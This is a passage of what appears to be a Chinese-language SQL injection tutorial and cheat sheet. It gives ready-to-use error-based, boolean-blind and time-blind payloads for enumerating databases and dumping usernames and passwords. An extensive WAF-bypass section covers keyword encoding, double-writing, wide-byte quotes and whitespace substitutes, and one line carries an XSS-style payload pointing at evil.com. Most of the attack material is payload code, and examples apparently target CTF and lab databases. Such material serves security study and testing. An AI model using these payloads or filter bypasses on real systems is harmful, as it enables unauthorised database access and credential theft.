<p><code>#&#39;;&quot;;</code> #之后被注释。</p>
<p>因此你输入的SQL语句<font color="red"> 将被独立代入MySQL数据库解析</font> ，以此达到注入的效果。</p>
<p>之后的按照注入点划分，也要判断数字型和字符型，以此类推。注入语句将放在后面统一讲。</p>
<h2 id="叠堆注入"><a href="#叠堆注入" class="headerlink" title="叠堆注入"></a>叠堆注入</h2><p>笼统的讲，叠堆注入也是联合注入。</p>
<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a><center>报错注入</center></h1><p>测试时发现会<font color="red"> 回显报错信息</font> ，就可以试试报错注入。</p>
<ul>
<li>报错注入主要用到3个函数<ul>
<li>floor()</li>
<li>extractvalue()</li>
<li>updatexml()</li>
</ul>
</li>
</ul>
<h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><ul>
<li><p>数据库</p>
  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">or</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(</span><br><span class="line">database()</span><br><span class="line">),<span class="number">0x7e</span>),<span class="number">1</span>))<span class="keyword">or</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>表</p>
  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">or</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(</span><br><span class="line"><span class="keyword">select</span>(group_concat(table_name))<span class="keyword">from</span>(information_schema.tables)<span class="keyword">where</span>(table_schema)<span class="keyword">like</span>(<span class="string">&#x27;cat&#x27;</span>)</span><br><span class="line">),<span class="number">0x7e</span>),<span class="number">1</span>))<span class="keyword">or</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>列名</p>
  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">or</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(</span><br><span class="line"><span class="keyword">select</span>(group_concat(column_name))<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>(table_name)<span class="keyword">like</span>(<span class="string">&#x27;H4rDsq1&#x27;</span>)</span><br><span class="line">),<span class="number">0x7e</span>),<span class="number">1</span>))<span class="keyword">or</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>dump</p>
  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">or</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span>(group_concat(id,username,password))<span class="keyword">from</span>(geek.H4rDsq1)</span><br><span class="line">),<span class="number">0x7e</span>),<span class="number">1</span>))<span class="keyword">or</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>其他几个函数以此类推，<font color="red"> 绕WAF根据数据库版本换成数学函数。</font> </p>
<h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a><center>盲注</center></h1><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p><font color="red"> 根据页面的回显不同来判断</font> 。</p>
<p>Payload</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">爆库名：?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and left((select database()),1)=&#x27;</span>s<span class="string">&#x27;--+</span></span><br><span class="line"><span class="string">爆表名：?id=1&#x27;</span> <span class="keyword">and</span> <span class="keyword">left</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="operator">=</span><span class="string">&#x27;security&#x27;</span> limit <span class="number">3</span>,<span class="number">1</span>),<span class="number">5</span>)<span class="operator">=</span><span class="string">&#x27;users&#x27;</span><span class="comment">--+</span></span><br><span class="line">爆列明：?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and left((select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; limit 1,1),8)=&#x27;</span>username<span class="string">&#x27;--+</span></span><br><span class="line"><span class="string">爆数据：?id=1&#x27;</span> <span class="keyword">and</span> <span class="keyword">left</span>((<span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> id limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">4</span>)<span class="operator">=</span><span class="string">&#x27;dumb&#x27;</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>




<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>根据回显时间的不同来判断。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>


<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">if((<span class="number">1</span>)<span class="keyword">like</span>(<span class="number">1</span>),<span class="number">5</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure>


<p>Payload</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">爆库长：?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(length(database())=8,sleep(5),NULL)--+</span></span><br><span class="line"><span class="string">爆库名：?id=1&#x27;</span> <span class="keyword">and</span> if(<span class="keyword">left</span>(database(),<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;s&#x27;</span>,sleep(<span class="number">5</span>),<span class="keyword">NULL</span>)<span class="comment">--+</span></span><br><span class="line">爆表名：?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(left((select table_name from information_schema.tables where table_schema=database() limit 1,1),1)=&#x27;</span>r<span class="string">&#x27;,sleep(5),NULL)--+</span></span><br><span class="line"><span class="string">爆列明：?id=1&#x27;</span> <span class="keyword">and</span> if(<span class="keyword">left</span>((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name <span class="operator">=</span> <span class="string">&#x27;users&#x27;</span> limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">8</span>)<span class="operator">=</span><span class="string">&#x27;username&#x27;</span>,sleep(<span class="number">5</span>),<span class="keyword">NULL</span>)<span class="comment">--+</span></span><br><span class="line">爆数据：?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(left((select username from users order by id limit 0,1),4)=&#x27;</span>dumb<span class="string">&#x27;,sleep(5),NULL)--+</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> if(<span class="keyword">left</span>((<span class="keyword">select</span> password <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> id limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">4</span>)<span class="operator">=</span><span class="string">&#x27;dumb&#x27;</span>,sleep(<span class="number">5</span>),<span class="keyword">NULL</span>)<span class="comment">--+</span></span><br></pre></td></tr></table></figure>


<p>其他皆可以此类推。</p>
<h1 id="group-concat的使用"><a href="#group-concat的使用" class="headerlink" title="group_concat的使用"></a><center>group_concat的使用</center></h1><p><font color="red"> mysql版本&gt;5.0切使用了information_schema数据库  </font> </p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(SCHEMA_NAME) <span class="keyword">from</span> (information_schema.schemata )</span><br><span class="line"></span><br></pre></td></tr></table></figure>




<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(table_name)<span class="keyword">from</span>(information_schema.tables)<span class="keyword">where</span> table_schema<span class="operator">=</span>database()</span><br><span class="line"></span><br></pre></td></tr></table></figure>




<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> (information_schema.columns) <span class="keyword">where</span> table_name<span class="operator">=</span><span class="number">0x61646D696E75736572</span></span><br></pre></td></tr></table></figure>




<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> group_concat(flag) <span class="keyword">from</span> sqli.flag</span><br></pre></td></tr></table></figure>


<p>其他以此类推。</p>
<h1 id="SQL注入绕过速查表"><a href="#SQL注入绕过速查表" class="headerlink" title="SQL注入绕过速查表"></a><center>SQL注入绕过速查表</center></h1><h2 id="过滤and-or"><a href="#过滤and-or" class="headerlink" title="过滤and or"></a>过滤and or</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">or</span>     ——<span class="operator">&gt;</span>    <span class="operator">||</span></span><br><span class="line"><span class="keyword">and</span>     ——<span class="operator">&gt;</span>    <span class="operator">&amp;&amp;</span></span><br><span class="line">xor ——<span class="operator">&gt;</span> <span class="operator">|</span>   </span><br><span class="line"><span class="keyword">not</span> ——<span class="operator">&gt;</span> <span class="operator">!</span></span><br><span class="line"></span><br><span class="line">十六进制绕过</span><br><span class="line"><span class="keyword">or</span> ——<span class="operator">&gt;</span> o\x72</span><br><span class="line"></span><br><span class="line">大小写绕过</span><br><span class="line"><span class="keyword">Or</span></span><br><span class="line"><span class="keyword">aNd</span></span><br><span class="line"></span><br><span class="line">双写绕过</span><br><span class="line">oorr</span><br><span class="line">anandd</span><br><span class="line"></span><br><span class="line">urlencode，ascii(<span class="type">char</span>)，hex，unicode编码绕过</span><br><span class="line">    一些unicode编码举例：</span><br><span class="line">    单引号：<span class="string">&#x27;</span></span><br><span class="line"><span class="string">    %u0027 %u02b9 %u02bc</span></span><br><span class="line"><span class="string">    %u02c8 %u2032</span></span><br><span class="line"><span class="string">    %uff07 %c0%27</span></span><br><span class="line"><span class="string">    %c0%a7 %e0%80%a7</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">关键字内联注释尝试绕所有</span></span><br><span class="line"><span class="string">/*!or*/</span></span><br><span class="line"><span class="string">/*!and*/</span></span><br></pre></td></tr></table></figure>


<h2 id="左括号过滤"><a href="#左括号过滤" class="headerlink" title="左括号过滤"></a>左括号过滤</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">urlencode，ascii(<span class="type">char</span>)，hex，unicode编码绕过</span><br><span class="line"><span class="operator">%</span>u0028 <span class="operator">%</span>uff08</span><br><span class="line"><span class="operator">%</span>c0<span class="operator">%</span><span class="number">28</span> <span class="operator">%</span>c0<span class="operator">%</span>a8</span><br><span class="line"><span class="operator">%</span>e0<span class="operator">%</span><span class="number">80</span><span class="operator">%</span>a8</span><br></pre></td></tr></table></figure>


<h2 id="过滤union-select"><a href="#过滤union-select" class="headerlink" title="过滤union\select"></a>过滤union\select</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">逻辑绕过</span><br><span class="line">例：</span><br><span class="line">过滤代码 <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">user</span>,password <span class="keyword">from</span> users</span><br><span class="line">绕过方式 <span class="number">1</span> <span class="operator">&amp;&amp;</span> (<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> users <span class="keyword">where</span> userid<span class="operator">=</span><span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span></span><br><span class="line"></span><br><span class="line">十六进制字符绕过</span><br><span class="line"><span class="keyword">select</span> ——<span class="operator">&gt;</span> selec\x74</span><br><span class="line"><span class="keyword">union</span>——<span class="operator">&gt;</span>unio\x6e</span><br><span class="line"></span><br><span class="line">大小写绕过</span><br><span class="line"><span class="keyword">SelEct</span></span><br><span class="line"></span><br><span class="line">双写绕过</span><br><span class="line">selselectect</span><br><span class="line">uniunionon</span><br><span class="line"></span><br><span class="line">urlencode，ascii(<span class="type">char</span>)，hex，unicode编码绕过</span><br><span class="line"></span><br><span class="line">关键字内联绕所有</span><br><span class="line"><span class="comment">/*!union*/</span></span><br><span class="line"><span class="comment">/*!select*/</span></span><br></pre></td></tr></table></figure>


<h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">用Tab代替空格<span class="operator">%</span><span class="number">20</span> <span class="operator">%</span><span class="number">09</span> <span class="operator">%</span><span class="number">0</span>a <span class="operator">%</span><span class="number">0</span>b <span class="operator">%</span><span class="number">0</span>c <span class="operator">%</span><span class="number">0</span>d <span class="operator">%</span>a0 <span class="comment">/**/</span>()</span><br><span class="line">绕过空格注释符绕过<span class="operator">/</span><span class="operator">/</span><span class="comment">--%20/**/#--+-- -;%00;</span></span><br><span class="line"></span><br><span class="line">空白字符绕过SQLite3  ——     <span class="number">0</span>A,<span class="number">0</span>D,<span class="number">0</span>c,<span class="number">09</span>,<span class="number">20</span></span><br><span class="line">MYSQL</span><br><span class="line">    <span class="number">09</span>,<span class="number">0</span>A,<span class="number">0</span>B,<span class="number">0</span>B,<span class="number">0</span>D,A0,<span class="number">20</span></span><br><span class="line">PosgressSQL</span><br><span class="line">    <span class="number">0</span>A,<span class="number">0</span>D,<span class="number">0</span>C,<span class="number">09</span>,<span class="number">20</span></span><br><span class="line">Oracle_11g</span><br><span class="line">    <span class="number">00</span>,<span class="number">0</span>A,<span class="number">0</span>D,<span class="number">0</span>C,<span class="number">09</span>,<span class="number">20</span></span><br><span class="line">MSSQL</span><br><span class="line">    <span class="number">01</span>,<span class="number">02</span>,<span class="number">03</span>,<span class="number">04</span>,<span class="number">05</span>,<span class="number">06</span>,<span class="number">07</span>,<span class="number">08</span>,<span class="number">09</span>,<span class="number">0</span>A,<span class="number">0</span>B,<span class="number">0</span>C,<span class="number">0</span>D,<span class="number">0</span>E,<span class="keyword">OF</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">1</span>A,<span class="number">1</span>B,<span class="number">1</span>C,<span class="number">1</span>D,<span class="number">1</span>E,<span class="number">1</span>F,<span class="number">20</span></span><br><span class="line">特殊符号绕过</span><br><span class="line">    `  <span class="operator">+</span>  ！</span><br><span class="line">等科学计数法绕过</span><br><span class="line">    例：</span><br><span class="line">    <span class="keyword">select</span> <span class="keyword">user</span>,password <span class="keyword">from</span> users <span class="keyword">where</span> user_id0e1union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span></span><br><span class="line">unicode编码</span><br><span class="line">    <span class="operator">%</span>u0020 <span class="operator">%</span>uff00</span><br><span class="line">    <span class="operator">%</span>c0<span class="operator">%</span><span class="number">20</span> <span class="operator">%</span>c0<span class="operator">%</span>a0 <span class="operator">%</span>e0<span class="operator">%</span><span class="number">80</span><span class="operator">%</span>a0</span><br></pre></td></tr></table></figure>


<h2 id="过滤-x3D"><a href="#过滤-x3D" class="headerlink" title="过滤&#x3D;"></a>过滤&#x3D;</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or 1 like 1#可以绕过对 = &gt; 等过滤</span></span><br><span class="line"><span class="string">or &#x27;</span><span class="number">1</span><span class="string">&#x27; IN (&#x27;</span><span class="number">1234</span><span class="string">&#x27;)#可以替代=</span></span><br></pre></td></tr></table></figure>


<h2 id="过滤比较符-lt-gt"><a href="#过滤比较符-lt-gt" class="headerlink" title="过滤比较符&lt;&gt;"></a>过滤比较符&lt;&gt;</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span><span class="operator">*</span>fromuserswhereid<span class="operator">=</span><span class="number">1</span><span class="keyword">and</span> ascii(substr(database(),<span class="number">0</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">64</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span><span class="operator">*</span>fromuserswhereid<span class="operator">=</span><span class="number">1</span><span class="keyword">and</span> greatest(ascii(substr(database(),<span class="number">0</span>,<span class="number">1</span>)),<span class="number">64</span>)<span class="operator">=</span><span class="number">64</span></span><br></pre></td></tr></table></figure>


<h2 id="过滤where"><a href="#过滤where" class="headerlink" title="过滤where"></a>过滤where</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">逻辑绕过</span><br><span class="line">过滤代码 <span class="number">1</span> <span class="operator">&amp;&amp;</span> (<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> users <span class="keyword">where</span> user_id <span class="operator">=</span> <span class="number">1</span>) <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">绕过方式 <span class="number">1</span> <span class="operator">&amp;&amp;</span> (<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> users limit <span class="number">1</span>) <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span></span><br></pre></td></tr></table></figure>


<h2 id="过滤limit"><a href="#过滤limit" class="headerlink" title="过滤limit"></a>过滤limit</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">逻辑绕过</span><br><span class="line">过滤代码 <span class="number">1</span> <span class="operator">&amp;&amp;</span> (<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> users limit <span class="number">1</span>) <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">绕过方式 <span class="number">1</span> <span class="operator">&amp;&amp;</span> (<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> users <span class="keyword">group</span> <span class="keyword">by</span> user_id <span class="keyword">having</span> user_id <span class="operator">=</span> <span class="number">1</span>) <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span>#user_id聚合中user_id为<span class="number">1</span>的<span class="keyword">user</span>为admin</span><br></pre></td></tr></table></figure>


<h2 id="过滤group-by"><a href="#过滤group-by" class="headerlink" title="过滤group by"></a>过滤group by</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">逻辑绕过</span><br><span class="line">过滤代码 <span class="number">1</span> <span class="operator">&amp;&amp;</span> (<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> users <span class="keyword">group</span> <span class="keyword">by</span> user_id <span class="keyword">having</span> user_id <span class="operator">=</span> <span class="number">1</span>) <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">绕过方式 <span class="number">1</span> <span class="operator">&amp;&amp;</span> (<span class="keyword">select</span> substr(group_concat(user_id),<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">user</span> <span class="keyword">from</span> users ) <span class="operator">=</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>


<h2 id="过滤select"><a href="#过滤select" class="headerlink" title="过滤select"></a>过滤select</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">逻辑绕过</span><br><span class="line">过滤代码 <span class="number">1</span> <span class="operator">&amp;&amp;</span> (<span class="keyword">select</span> substr(group_concat(user_id),<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">user</span> <span class="keyword">from</span> users ) <span class="operator">=</span> <span class="number">1</span></span><br><span class="line">绕过方式 <span class="number">1</span> <span class="operator">&amp;&amp;</span> substr(<span class="keyword">user</span>,<span class="number">1</span>,<span class="number">1</span>) <span class="operator">=</span> <span class="string">&#x27;a&#x27;</span></span><br></pre></td></tr></table></figure>


<h2 id="过滤’-单引号"><a href="#过滤’-单引号" class="headerlink" title="过滤’(单引号)"></a>过滤’(单引号)</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">逻辑绕过</span><br><span class="line">waf <span class="operator">=</span> <span class="string">&#x27;and|or|union|where|limit|group by|select|\&#x27;&#x27;</span></span><br><span class="line"><span class="string">过滤代码 1 &amp;&amp; substr(user,1,1) = &#x27;</span>a<span class="string">&#x27;</span></span><br><span class="line"><span class="string">绕过方式 1 &amp;&amp; user_id is not null1 &amp;&amp; substr(user,1,1) = 0x611 &amp;&amp; substr(user,1,1) = unhex(61)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">宽字节绕过</span></span><br><span class="line"><span class="string">%bf%27 %df%27 %aa%27</span></span><br></pre></td></tr></table></figure>


<h2 id="过滤逗号"><a href="#过滤逗号" class="headerlink" title="过滤逗号"></a>过滤逗号</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用<span class="keyword">from</span> <span class="keyword">to</span>的方式来解决：</span><br><span class="line">selectsubstr(database(<span class="number">0</span>from1for1);selectmid(database(<span class="number">0</span>from1for1);</span><br><span class="line"></span><br><span class="line">对于limit可以使用<span class="keyword">offset</span>来绕过：</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span><span class="operator">*</span>fromnews limit0,<span class="number">1</span># 等价于下面这条<span class="keyword">SQL</span>语句<span class="keyword">select</span><span class="operator">*</span>fromnews limit1offset0</span><br></pre></td></tr></table></figure>


<h2 id="过滤hex"><a href="#过滤hex" class="headerlink" title="过滤hex"></a>过滤hex</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">逻辑绕过</span><br><span class="line">过滤代码 <span class="number">1</span> <span class="operator">&amp;&amp;</span> substr(<span class="keyword">user</span>,<span class="number">1</span>,<span class="number">1</span>) <span class="operator">=</span> unhex(<span class="number">61</span>)</span><br><span class="line">绕过方式 <span class="number">1</span> <span class="operator">&amp;&amp;</span> substr(<span class="keyword">user</span>,<span class="number">1</span>,<span class="number">1</span>) <span class="operator">=</span> <span class="built_in">lower</span>(conv(<span class="number">11</span>,<span class="number">10</span>,<span class="number">16</span>)) #十进制的<span class="number">11</span>转化为十六进制，并小写。</span><br></pre></td></tr></table></figure>


<h2 id="过滤substr"><a href="#过滤substr" class="headerlink" title="过滤substr"></a>过滤substr</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">逻辑绕过</span><br><span class="line"></span><br><span class="line">过滤代码 <span class="number">1</span> <span class="operator">&amp;&amp;</span> substr(<span class="keyword">user</span>,<span class="number">1</span>,<span class="number">1</span>) <span class="operator">=</span> <span class="built_in">lower</span>(conv(<span class="number">11</span>,<span class="number">10</span>,<span class="number">16</span>)) </span><br><span class="line">绕过方式 <span class="number">1</span> <span class="operator">&amp;&amp;</span> lpad(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">in</span> <span class="string">&#x27;r&#x27;</span></span><br></pre></td></tr></table></figure>


<h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><p>利用urlencode，ascii(char)，hex，unicode等编码绕过</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>即<span class="operator">%</span><span class="number">6</span>f<span class="operator">%</span><span class="number">72</span><span class="operator">%</span><span class="number">20</span><span class="operator">%</span><span class="number">31</span><span class="operator">%</span><span class="number">3</span>d<span class="operator">%</span><span class="number">31</span>，而Test也可以为<span class="type">CHAR</span>(<span class="number">101</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">97</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">115</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">116</span>)。</span><br><span class="line"></span><br><span class="line">十六进制编码</span><br><span class="line"><span class="keyword">SELECT</span>(extractvalue(<span class="number">0x3C613E61646D696E3C2F613E</span>,<span class="number">0x2f61</span>))</span><br><span class="line"></span><br><span class="line">双重编码绕过</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">252</span>f<span class="operator">%</span><span class="number">252</span>a<span class="operator">*</span><span class="operator">/</span><span class="keyword">UNION</span><span class="operator">%</span><span class="number">252</span>f<span class="operator">%</span><span class="number">252</span>a <span class="operator">/</span><span class="keyword">SELECT</span><span class="operator">%</span><span class="number">252</span>f<span class="operator">%</span><span class="number">252</span>a<span class="operator">*</span><span class="operator">/</span><span class="number">1</span>,<span class="number">2</span>,password<span class="operator">%</span><span class="number">252</span>f<span class="operator">%</span><span class="number">252</span>a<span class="operator">*</span><span class="operator">/</span><span class="keyword">FROM</span><span class="operator">%</span><span class="number">252</span>f<span class="operator">%</span><span class="number">252</span>a<span class="operator">*</span><span class="operator">/</span>Users<span class="comment">--+</span></span><br></pre></td></tr></table></figure>


<h2 id="等价函数或变量"><a href="#等价函数或变量" class="headerlink" title="等价函数或变量"></a>等价函数或变量</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">hex()、bin() <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> ascii()</span><br><span class="line"></span><br><span class="line">sleep() <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span>benchmark()</span><br><span class="line"></span><br><span class="line">concat_ws()<span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span>group_concat()</span><br><span class="line"></span><br><span class="line">mid()、substr() <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> <span class="built_in">substring</span>()</span><br><span class="line"></span><br><span class="line">@<span class="variable">@user</span> <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> <span class="keyword">user</span>()</span><br><span class="line"></span><br><span class="line">@<span class="variable">@datadir</span> <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> datadir()</span><br><span class="line"></span><br><span class="line">举例：<span class="built_in">substring</span>()和substr()无法使用时：?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> ascii(<span class="built_in">lower</span>(mid((<span class="keyword">select</span> pwd <span class="keyword">from</span> users limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)))<span class="operator">=</span><span class="number">74</span>　</span><br><span class="line"></span><br><span class="line">或者：</span><br><span class="line">substr((<span class="keyword">select</span> <span class="string">&#x27;password&#x27;</span>),<span class="number">1</span>,<span class="number">1</span>) <span class="operator">=</span> <span class="number">0x70</span></span><br><span class="line">strcmp(<span class="keyword">left</span>(<span class="string">&#x27;password&#x27;</span>,<span class="number">1</span>), <span class="number">0x69</span>) <span class="operator">=</span> <span class="number">1</span></span><br><span class="line">strcmp(<span class="keyword">left</span>(<span class="string">&#x27;password&#x27;</span>,<span class="number">1</span>), <span class="number">0x70</span>) <span class="operator">=</span> <span class="number">0</span></span><br><span class="line">strcmp(<span class="keyword">left</span>(<span class="string">&#x27;password&#x27;</span>,<span class="number">1</span>), <span class="number">0x71</span>) <span class="operator">=</span> <span class="number">-1</span></span><br></pre></td></tr></table></figure>


<h2 id="生僻函数"><a href="#生僻函数" class="headerlink" title="生僻函数"></a>生僻函数</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">MySQL<span class="operator">/</span>PostgreSQL支持XML函数：<span class="keyword">Select</span> UpdateXML(‘<span class="operator">&lt;</span>script x<span class="operator">=</span>_<span class="operator">&gt;</span><span class="operator">&lt;</span><span class="operator">/</span>script<span class="operator">&gt;</span> ’,’<span class="operator">/</span>script<span class="operator">/</span><span class="variable">@x</span><span class="operator">/</span>’,’src<span class="operator">=</span><span class="operator">/</span><span class="operator">/</span>evil.com’);　　　　　　　　　　</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x3a</span>,(<span class="keyword">select</span> <span class="keyword">user</span>())),<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> xmlelement(name img,xmlattributes(<span class="number">1</span><span class="keyword">as</span> src,<span class="string">&#x27;a\l\x65rt(1)&#x27;</span><span class="keyword">as</span> \<span class="number">117</span>n\x65rror));　<span class="operator">/</span><span class="operator">/</span>postgresql</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>, concat(<span class="number">0x5c</span>, (<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables limit <span class="number">1</span>)));</span><br><span class="line"></span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x5c</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x5c</span>),<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">and</span> extractvalue(<span class="number">1</span>, concat(<span class="number">0x5c</span>, (<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x5c</span>))</span><br></pre></td></tr></table></figure>


<h2 id="N绕过"><a href="#N绕过" class="headerlink" title="\N绕过"></a>\N绕过</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">8E0</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">0</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">8.0</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">0</span></span><br><span class="line">  <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span>\Nunion <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">0</span></span><br></pre></td></tr></table></figure>


